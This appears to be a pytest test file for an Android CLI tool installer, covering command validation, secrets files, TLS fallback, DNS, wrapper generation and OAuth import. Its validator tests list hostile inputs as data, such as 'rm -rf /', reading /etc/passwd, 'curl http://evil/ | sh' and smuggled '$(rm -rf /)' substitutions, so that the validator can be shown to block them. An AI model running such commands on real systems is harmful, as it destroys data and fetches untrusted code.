# -*- coding: utf-8 -*-
"""Unit tests for ancli-core.py security & wrapper-generation logic.

Runs on any host (no Android device required). Import-safe: the module only
reads config files that don't exist on a dev machine.
"""
import json
import os
import ssl
import sys
import urllib.error

import pytest

# ancli-core.py contains a hyphen, so it cannot be imported by module name;
# load it by explicit file path instead.
_core_path = os.path.join(os.path.dirname(__file__), "..", "src", "ancli-core.py")
import importlib.util  # noqa: E402
_spec = importlib.util.spec_from_file_location("ancli_core", _core_path)
core = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(core)


# ---------------------------------------------------------------------------
# validate_cmd
# ---------------------------------------------------------------------------

class TestValidateCmd:
    @pytest.mark.parametrize("cmd", [
        "pip install --break-system-packages aider-chat",
        "npm install -g something",
        "apt-get update -qy",
        "curl -sL https://example.com/x | bash -s -- --dir /usr/local/bin",
        "rm -f /usr/local/bin/mimo",
        "bash /tmp/install_agy.sh --dir /usr/local/bin",
        "sh /tmp/install_x.sh",
        "env GROK_BIN_DIR=/usr/local/bin bash /tmp/install_grok.sh",
        "curl -L https://a/b -o /tmp/x.tar.gz && tar -xzf /tmp/x.tar.gz -C /usr/local/bin && rm /tmp/x.tar.gz",
    ])
    def test_allows_legit_registry_commands(self, cmd):
        assert core.validate_cmd(cmd) is True

    @pytest.mark.parametrize("cmd", [
        "rm -rf / ; echo pwned",
        "pip install x > /etc/passwd",
        "npm install x < /etc/shadow",
        "bash /tmp/x.sh &\ncurl evil",
        "curl http://evil/ | sh; touch /pwned",
        "bash /tmp/x.sh & disown",
        "rm -rf /$(whoami)",
        "curl -o /tmp/x `id`",
        "echo hello",
        "sudo rm -rf /",
        "cat /etc/passwd",
        "env A=1; rm -rf /",
    ])
    def test_blocks_dangerous_commands(self, cmd):
        assert core.validate_cmd(cmd) is False

    @pytest.mark.parametrize("cmd", [
        # Semicolons etc. inside quoted values are data, not shell syntax
        "env GROK_BIN_DIR='a;b' bash /tmp/install_grok.sh",
        'env FLAG="x > y" bash /tmp/install.sh',
        "bash /tmp/x.sh --dir '/a b'",
        "curl -sL 'https://x/a;b.sh' -o /tmp/x.sh && bash /tmp/x.sh",
        # $() inside single quotes is literal -> allowed
        "curl -sL 'https://x/$(id)' -o /tmp/x.sh",
        # & inside double quotes is literal -> allowed
        'env FLAG="a & b" bash /tmp/install.sh',
    ])
    def test_allows_quoted_special_chars(self, cmd):
        assert core.validate_cmd(cmd) is True

    @pytest.mark.parametrize("cmd", [
        # $() / backticks execute even inside double quotes -> must be blocked
        'env FLAG="$(rm -rf /)" bash /tmp/install.sh',
        'env FLAG="`id`" bash /tmp/install.sh',
        # ANSI-C $'...' quoting expands escapes at runtime -> not stripped
        "curl $';rm -rf /' -o /tmp/x.sh",
    ])
    def test_blocks_command_substitution_inside_double_quotes(self, cmd):
        assert core.validate_cmd(cmd) is False

    def test_whitelist_prefix_requires_trailing_space(self):
        # "curl" alone (no space) must not match the "curl " prefix
        assert core.validate_cmd("curl") is False


# ---------------------------------------------------------------------------
# _write_secrets_file
# ---------------------------------------------------------------------------

class TestWriteSecretsFile:
    def test_writes_quoted_exports_and_permissions(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path))
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path.parent))
        chowns = []
        chmods = []
        monkeypatch.setattr(core.os, "system",
                            lambda c: chowns.append(c) or 0)
        monkeypatch.setattr(core.os, "chmod",
                            lambda p, m: chmods.append((os.path.normpath(str(p)), m)))

        core._write_secrets_file("my-tool", {"API_KEY": "sk-a b'c", "BASE_URL": "https://x"})

        secrets = tmp_path / "my-tool.env"
        assert secrets.exists()
        content = secrets.read_text()
        assert "export API_KEY='sk-a b'\"'\"'c'\n" in content  # shlex.quote escaping
        assert "export BASE_URL=https://x\n" in content  # plain value stays unquoted
        # Directory 0700, secrets file 0600 (POSIX modes; asserted via chmod calls
        # since Windows filesystems do not honor mode bits)
        assert (os.path.normpath(str(tmp_path)), 0o700) in chmods
        assert (os.path.normpath(str(secrets)), 0o600) in chmods
        # shell user (UID 2000) must be able to traverse dir and read the file
        assert any("chown 2000:2000" in c and str(tmp_path) in c for c in chowns)
        assert any("chown 2000:2000" in c and "my-tool.env" in c for c in chowns)

    def test_replaces_existing_file(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path))
        (tmp_path / "tool.env").write_text("export OLD=1\n")
        core._write_secrets_file("tool", {"NEW": "2"})
        content = (tmp_path / "tool.env").read_text()
        assert "OLD" not in content
        assert "NEW" in content


# ---------------------------------------------------------------------------
# TLS verification fallback
# ---------------------------------------------------------------------------

class TestRegistryTLS:
    def test_falls_back_to_unverified_only_on_cert_error(self, monkeypatch):
        calls = []
        class FakeResp:
            def read(self):
                return b'{"apps": {}}'
            def __enter__(self):
                return self
            def __exit__(self, *a):
                return False

        class FakeURLOpen:
            def __init__(self, fail_first):
                self._fail_first = fail_first
            def __call__(self, req, timeout=15, context=None):
                calls.append((timeout, context))
                if self._fail_first and context is None:
                    raise urllib.error.URLError(ssl.SSLCertVerificationError(1, "cert"))
                return FakeResp()

        monkeypatch.setattr(core.urllib.request, "urlopen", FakeURLOpen(True))
        data = core._fetch_registry_once(object())
        assert data == {"apps": {}}
        # First call verified (context None), second unverified
        assert calls[0][1] is None
        assert calls[1][1] is not None

    def test_network_error_propagates(self, monkeypatch):
        def boom(req, timeout=15, context=None):
            raise urllib.error.URLError("connection refused")

        monkeypatch.setattr(core.urllib.request, "urlopen", boom)
        with pytest.raises(urllib.error.URLError):
            core._fetch_registry_once(object())

    def test_protocol_error_does_not_trigger_unverified_fallback(self, monkeypatch):
        """Handshake/protocol SSL errors must NOT downgrade to unverified TLS."""
        calls = []

        def boom(req, timeout=15, context=None):
            calls.append(context)
            raise ssl.SSLError("WRONG_VERSION_NUMBER")

        monkeypatch.setattr(core.urllib.request, "urlopen", boom)
        with pytest.raises(ssl.SSLError):
            core._fetch_registry_once(object())
        assert calls == [None]  # only one attempt, always verified


# ---------------------------------------------------------------------------
# pipe-script install command construction
# ---------------------------------------------------------------------------

class TestPipeScriptCommand:
    def test_env_prefix_uses_env_not_nested_bash_c(self):
        import shlex
        # Simulate the exact construction used in _install_pipe_script
        installer_env = {"GROK_BIN_DIR": "/usr/local/bin", "FLAG": "a b"}
        script_path = "/tmp/install_grok.sh"
        installer_args = '--dir "/a b"'

        cmd = f"bash {shlex_quote(script_path)}"
        if installer_env:
            env_prefix = " ".join(
                f"{shlex_quote(k)}={shlex_quote(v)}" for k, v in installer_env.items()
            )
            cmd = f"env {env_prefix} {cmd}"
        if installer_args:
            # shlex.split honors quoting inside installer_args
            cmd += " " + " ".join(shlex_quote(a) for a in shlex.split(installer_args))

        # No nested single quotes; every value individually quoted
        assert cmd.startswith("env ")
        assert "bash -c '" not in cmd
        assert core.validate_cmd(cmd) is True
        # Round-trip through shlex must reproduce the intended argv
        argv = shlex_split(cmd)
        assert argv[0] == "env"
        assert "GROK_BIN_DIR=/usr/local/bin" in argv
        assert "FLAG=a b" in argv
        assert argv[argv.index("bash") + 1] == script_path
        # Quoted installer arg survives as a single token
        assert "--dir" in argv and "/a b" in argv


# ---------------------------------------------------------------------------
# DNS resolution
# ---------------------------------------------------------------------------

class TestDNS:
    def test_get_android_dns_reads_real_servers(self, monkeypatch):
        outputs = iter(["192.168.1.1", "0.0.0.0"])
        monkeypatch.setattr(
            core.subprocess, "check_output",
            lambda cmd, shell=True: outputs.__next__().encode(),
        )
        assert core._get_android_dns() == ["192.168.1.1"]

    def test_write_resolv_conf_prefers_android_dns(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path))
        os.makedirs(tmp_path / "etc", exist_ok=True)
        monkeypatch.setattr(
            core.subprocess, "check_output",
            lambda cmd, shell=True: b"192.168.1.1",
        )
        core._write_resolv_conf()
        content = (tmp_path / "etc" / "resolv.conf").read_text()
        lines = content.strip().splitlines()
        assert lines[0] == "nameserver 192.168.1.1"  # real DNS first
        assert lines[1] == "nameserver 8.8.8.8"      # then Google fallback
        assert len(lines) == 3                        # glibc MAXNS
        assert len(lines) == len(set(lines))          # no duplicates

    def test_get_android_dns_rejects_garbage(self, monkeypatch):
        # Only two getprop calls happen (net.dns1/net.dns2): a non-IP and an
        # IPv6 must both be rejected; the IPv4 duplicate must be deduplicated.
        outputs = iter(["10.0.0.2", "10.0.0.2"])
        monkeypatch.setattr(
            core.subprocess, "check_output",
            lambda cmd, shell=True: outputs.__next__().encode(),
        )
        assert core._get_android_dns() == ["10.0.0.2"]

        outputs = iter(["not-an-ip", "2001:db8::1"])
        monkeypatch.setattr(
            core.subprocess, "check_output",
            lambda cmd, shell=True: outputs.__next__().encode(),
        )
        assert core._get_android_dns() == []


# ---------------------------------------------------------------------------
# wrapper generation
# ---------------------------------------------------------------------------

class TestWrapperGeneration:
    def test_wrapper_template_has_cwd_fallback_and_binds(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))
        os.makedirs(tmp_path / "ancli" / "bin", exist_ok=True)

        core.generate_proot_wrapper("mimo", {"OPENAI_API_KEY": "sk-x"}, ["HOME=/root"])

        wrapper = (tmp_path / "ancli" / "bin" / "mimo").read_text()
        # cwd fallback for unbound host paths -> container HOME
        assert "PROOT_CWD=\"$PWD\"" in wrapper
        assert "case \"$PROOT_CWD\"" in wrapper
        assert '-w "$PROOT_CWD"' in wrapper
        assert "PROOT_CWD=/root" in wrapper
        # root-dir redirect so TUI tools don't scan the whole container fs
        assert 'if [ "$PROOT_CWD" = "/" ]; then' in wrapper
        assert "Launched from /" in wrapper
        # /dev/shm conditional bind for Node/Bun workers
        assert 'SHM_BIND="-b ' in wrapper
        assert "shm:/dev/shm" in wrapper
        # full unconditional binds (AGENTS.md requirement)
        assert "-b /sdcard -b /storage -b /mnt -b /data -b /apex -b /linkerconfig -b /system" in wrapper
        # env bootstrap + per-tool secrets sourcing
        assert "ancli_env.sh" in wrapper
        assert "secrets/mimo.env" in wrapper
        # systemless + KSU/AP dual injection paths were attempted
        assert (tmp_path / "mod" / "system" / "bin" / "mimo").exists()

    def test_native_wrapper_runs_without_proot(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))
        os.makedirs(tmp_path / "ancli" / "bin", exist_ok=True)

        core.generate_proot_wrapper("agy", {"GEMINI_API_KEY": "sk-x"}, [], native=True)

        wrapper = (tmp_path / "ancli" / "bin" / "agy").read_text()
        assert "(native" in wrapper
        assert "ancli_env.sh host" in wrapper          # host-mode env bootstrap
        assert "/bin/proot" not in wrapper             # no proot invocation at all
        assert "proot -r" not in wrapper
        assert "BROWSER=" in wrapper                   # OAuth browser redirect
        assert "xdg-open" in wrapper
        assert f"{core.ROOTFS}/usr/local/bin/agy" in wrapper  # direct exec of static bin
        # secrets still sourced
        assert "secrets/agy.env" in wrapper

    def test_native_shims_bridge_to_container(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path / "rootfs"))
        os.makedirs(tmp_path / "ancli" / "bin", exist_ok=True)
        chmods = []
        monkeypatch.setattr(core.os, "chmod",
                            lambda p, m: chmods.append((os.path.normpath(str(p)), m)))

        core._deploy_native_shims()

        for tool in ("git", "bash", "curl"):
            shim = tmp_path / "ancli" / "bin" / tool
            assert shim.exists()
            # 0755 exec bit (asserted via chmod calls; Windows ignores mode bits)
            assert (os.path.normpath(str(shim)), 0o755) in chmods
            content = shim.read_text()
            assert 'TOOL=$(basename "$0")' in content
            assert f"{core.ROOTFS}" in content          # container rootfs
            assert "/usr/bin/env \"$TOOL\"" in content  # runs container tool
            assert "proot" in content

    def test_wrapper_rejects_path_traversal_executable(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        core.generate_proot_wrapper("../evil", {})
        assert not (tmp_path / "ancli" / "bin").exists()


# ---------------------------------------------------------------------------
# WebUI JSON API
# ---------------------------------------------------------------------------

class TestWebUIJsonAPI:
    def _reg(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path / "rootfs"))
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))
        monkeypatch.setattr(core, "INSTALLED_FILE", str(tmp_path / "ancli" / "installed.json"))
        os.makedirs(tmp_path / "ancli" / "bin", exist_ok=True)
        reg = {
            "version": "1.0",
            "apps": {
                "mimo": {"name": "MiMo Code", "executable": "mimo", "native": False},
                "agy": {"name": "Antigravity", "executable": "agy", "native": True,
                        "version": "2.0", "env_vars": ["GEMINI_API_KEY"],
                        "optional_env_vars": ["HTTP_PROXY"]},
            },
        }
        reg_path = tmp_path / "registry.json"
        reg_path.write_text(json.dumps(reg), encoding="utf-8")
        monkeypatch.setattr(core, "LOCAL_REGISTRY", str(reg_path))
        return reg

    def test_list_apps_json_clean_output(self, tmp_path, monkeypatch, capsys):
        self._reg(tmp_path, monkeypatch)
        core.save_installed({"mimo": {"executable": "mimo", "installed_version": "1.0",
                                      "env": {"OPENAI_API_KEY": "x"}}})
        os.makedirs(tmp_path / "rootfs" / "usr" / "local" / "bin", exist_ok=True)
        (tmp_path / "rootfs" / "usr" / "local" / "bin" / "mimo").write_text("x")

        core.list_apps_json()
        data = json.loads(capsys.readouterr().out)  # must be pure JSON
        apps = {a["id"]: a for a in data["apps"]}
        assert apps["mimo"]["installed"] is True and apps["mimo"]["active"] is True
        assert apps["mimo"]["configured_keys"] == ["OPENAI_API_KEY"]
        assert apps["agy"]["installed"] is False and apps["agy"]["native"] is True
        assert apps["agy"]["update_available"] is False  # not installed
        assert "GEMINI_API_KEY" in apps["agy"]["required_env_vars"]
        assert "HTTP_PROXY" in apps["agy"]["optional_env_vars"]

    def test_status_json(self, tmp_path, monkeypatch, capsys):
        self._reg(tmp_path, monkeypatch)
        os.makedirs(tmp_path / "rootfs" / "bin", exist_ok=True)
        (tmp_path / "rootfs" / "bin" / "bash").write_text("")
        (tmp_path / "ancli" / "bin" / "proot").write_text("")

        core.status_json()
        d = json.loads(capsys.readouterr().out)
        assert d["rootfs_ready"] is True and d["proot_deployed"] is True
        assert d["installed_count"] == 0

    def test_parse_set_env(self):
        assert core.parse_set_env(["--set", "A=1", "--set", "B=2", "junk"]) == {"A": "1", "B": "2"}
        assert core.parse_set_env([]) == {}

    def test_reconfigure_noninteractive_merges_existing(self, tmp_path, monkeypatch):
        self._reg(tmp_path, monkeypatch)
        core.save_installed({"agy": {"executable": "agy", "installed_version": "1.0",
                                     "env": {"GEMINI_API_KEY": "old"}}})
        registry = {"apps": {"agy": {"name": "Antigravity", "executable": "agy",
                                     "env_vars": ["GEMINI_API_KEY"]}}}

        core.reconfigure_app("agy", registry, set_env={"GEMINI_API_KEY": "new"})

        installed = core.load_installed()
        assert installed["agy"]["env"] == {"GEMINI_API_KEY": "new"}
        # wrapper regenerated with the new secret
        wrapper = (tmp_path / "ancli" / "bin" / "agy").read_text()
        assert "secrets/agy.env" in wrapper
        secrets = (tmp_path / "secrets" / "agy.env").read_text()
        assert "GEMINI_API_KEY" in secrets and "new" in secrets


# ---------------------------------------------------------------------------
# OAuth import
# ---------------------------------------------------------------------------

class TestOAuthImport:
    def test_imports_credentials_to_agy_path(self, tmp_path, monkeypatch, capsys):
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path / "rootfs"))
        src = tmp_path / "token_src"
        src.write_text('{"refresh_token": "1//0abc", "access_token": "ya29.x"}', encoding="utf-8")
        chowns = []
        monkeypatch.setattr(core.os, "system",
                            lambda c: chowns.append(c) or 0)

        ok = core.import_oauth("agy", str(src))
        assert ok is True
        dest = tmp_path / "rootfs" / "root" / ".gemini" / "antigravity-cli" / "antigravity-oauth-token"
        assert dest.exists()
        assert dest.read_text(encoding="utf-8") == src.read_text(encoding="utf-8")
        assert any("chown 2000:2000" in c and "antigravity-oauth-token" in c for c in chowns)
        assert "imported" in capsys.readouterr().out.lower()

    def test_rejects_missing_or_empty_source(self, tmp_path, monkeypatch, capsys):
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path / "rootfs"))
        assert core.import_oauth("agy", str(tmp_path / "nope")) is False
        empty = tmp_path / "empty"
        empty.write_text("", encoding="utf-8")
        assert core.import_oauth("agy", str(empty)) is False

    def test_unsupported_app_rejected(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path / "rootfs"))
        src = tmp_path / "s"; src.write_text("x", encoding="utf-8")
        assert core.import_oauth("mimo", str(src)) is False


# ---------------------------------------------------------------------------
# Registry auth-config policy: only tools whose official docs confirm env-var
# auth keep env_vars. (Claude Code: ANTHROPIC_API_KEY skips its login prompt.)
# ---------------------------------------------------------------------------

def test_registry_env_vars_only_claude_code():
    with open(os.path.join(os.path.dirname(__file__), '..', 'src', 'registry.json'), encoding='utf-8') as f:
        reg = json.load(f)
    assert 'claude-code' in reg['apps']
    for aid, app in reg['apps'].items():
        has = bool(app.get('env_vars') or app.get('optional_env_vars'))
        if aid == 'claude-code':
            assert has, 'claude-code must keep env vars (ANTHROPIC_API_KEY)'
        else:
            assert not has, f'{aid} must not expose env vars (login is tool-internal)'


def shlex_quote(s):
    import shlex
    return shlex.quote(s)


def shlex_split(s):
    import shlex
    return shlex.split(s)
